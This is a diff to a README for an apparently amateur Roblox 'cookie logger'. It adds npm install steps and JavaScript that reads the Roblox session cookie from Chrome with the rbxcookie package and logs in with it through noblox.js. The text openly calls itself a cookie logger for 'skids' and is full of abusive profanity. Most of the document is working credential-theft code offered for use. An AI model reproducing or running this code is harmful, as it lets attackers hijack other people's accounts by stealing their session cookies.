@@ -19,7 +19,9 @@ sigh just a shitty cookie logger when i am done with exams and shit i'll make my
 # STEPS FOR SKIDS
 
 Install these first
-
+```js
+npm i github:ClockworkSquirrel/rbxcookie
+```
 ```
 npm i github:ClockworkSquirrel/rbxcookie --no-optional
 ```
@@ -32,6 +34,7 @@ npm i noblox.js -g
 a simple fucking way to check this shitty ass logger is by
 
 ```js
+const rbxcookie = require("rbxcookie")
 const ChromeCookie = new rbxcookie.Chrome()
 
 async function skidcity() {
@@ -44,6 +47,11 @@ skidcity()
 Here is a more detailed explanation of validating the cookie u fucking dumbass roblox.js bs is automated so its easy af u stupid piece of shit
 
 ```js
+const rbxcookie = require("rbxcookie")
+const ChromeCookie = new rbxcookie.Chrome()
+const cbx = require("noblox.js")
+
+
 async function skidcity() {
     const cookie = await ChromeCookie.cookie()
     await cbx.setCookie(cookie)
